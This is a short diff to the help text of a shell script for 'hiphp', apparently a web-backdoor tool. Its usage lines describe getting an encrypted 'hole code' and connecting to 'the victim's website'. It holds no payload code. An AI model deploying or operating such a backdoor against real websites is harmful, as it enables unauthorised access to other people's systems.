@@ -17,8 +17,8 @@ if [ -z "$1" ]; then
     echo "Usage: hiphp [OPTION]";
     echo "";
     echo "ex:  hiphp --help               | # hiphp cli help.";
-    echo "     hiphp --geth [KEY] [URL]   | # Get the hole Code.";
-    echo "     hiphp [KEY] [URL]          | # Connect to the victim's website.";
+    echo "     hiphp --geth [KEY] [URL]   | # Get the HIPHP_HOLE_CODE Encrypted by your [KEY].";
+    echo "     hiphp [KEY] [URL]          | # Connect to the victim's website (CLI) Mode.";
     echo "     hiphp --version            | # Get the version number you are working with.";
 
 #cli help:
